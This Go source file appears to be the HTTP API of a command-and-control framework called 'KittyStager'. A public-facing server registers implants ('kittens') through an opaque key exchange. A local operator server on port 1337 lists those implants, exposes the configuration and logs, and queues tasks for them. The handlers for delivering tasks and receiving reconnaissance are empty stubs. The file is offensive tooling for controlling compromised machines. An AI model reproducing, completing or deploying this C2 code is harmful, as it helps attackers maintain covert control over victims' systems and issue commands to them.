package api

import (
	"KittyStager/internal/config"
	"KittyStager/internal/kitten"
	"KittyStager/internal/task"
	"KittyStager/pkg/crypto"
	"fmt"
	"github.com/gin-gonic/gin"
	"golang.org/x/sync/errgroup"
	"io"
	"log"
	"os"
	"time"
)

var (
	Kittens map[string]*kitten.Kitten
	conf    *config.Config
	g       errgroup.Group
)

func init() {
	Kittens = make(map[string]*kitten.Kitten)
}

func Api(config *config.Config) error {
	conf = config
	//Log for frontend
	f, err := os.Create("api.log")
	if err != nil {
		return err
	}
	gin.DefaultWriter = io.MultiWriter(f)
	gin.SetMode(gin.ReleaseMode)
	front := gin.Default()
	front.GET(conf.GetGetEndpoint(), getTask)
	front.POST(conf.GetPostEndpoint(), postRecon)
	front.POST(conf.GetOpaqueEndpoint(), postReg)
	addr := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())

	//Disable log for backend
	gin.DefaultWriter = io.Discard
	back := gin.Default()
	back.GET("kittensList", getKittensList)
	back.GET("conf", getConf)
	back.GET("logs", getLogs)
	back.GET("task/:name", getTaskByName)
	back.POST("task/:name", createTaskByName)
	//frontend
	g.Go(func() error {
		return front.Run(addr)
	})
	//backend
	g.Go(func() error {
		return back.Run("127.0.0.1:1337")
	})

	if err := g.Wait(); err != nil {
		log.Fatal(err)
	}
	return nil
}

func getTask(c *gin.Context) {
}

func postRecon(c *gin.Context) {
}
func postReg(c *gin.Context) {
	data, err := io.ReadAll(c.Request.Body)
	if err != nil {
		return
	}
	dataToReturn, name, key := crypto.HandleAuth(data)
	_, err = c.Writer.Write(dataToReturn)
	if err != nil {
		return
	}
	kitty := kitten.Kitten{
		Name:     name,
		Sleep:    conf.Sleep,
		LastSeen: time.Now(),
		Alive:    true,
		Key:      key,
		Tasks:    nil,
		Recon:    nil,
	}
	Kittens[kitty.Name] = &kitty
}

// backend
func getKittensList(c *gin.Context) {
	c.IndentedJSON(200, &Kittens)
}

func getConf(c *gin.Context) {
	c.IndentedJSON(200, &conf)
}

func getLogs(c *gin.Context) {
	b, err := os.ReadFile("api.log") // just pass the file name
	if err != nil {
		return
	}
	_, err = c.Writer.Write(b)
	if err != nil {
		return
	}
}

func getTaskByName(c *gin.Context) {
	name := c.Param("name")
	c.IndentedJSON(200, &Kittens[name].Tasks)
}

func createTaskByName(c *gin.Context) {
	name := c.Param("name")
	var t task.Task
	var b []byte
	b, err := io.ReadAll(c.Request.Body)
	err = t.UnmarshallTask(b)
	if err != nil {
		return
	}
	Kittens[name].SetTask(&t)
}
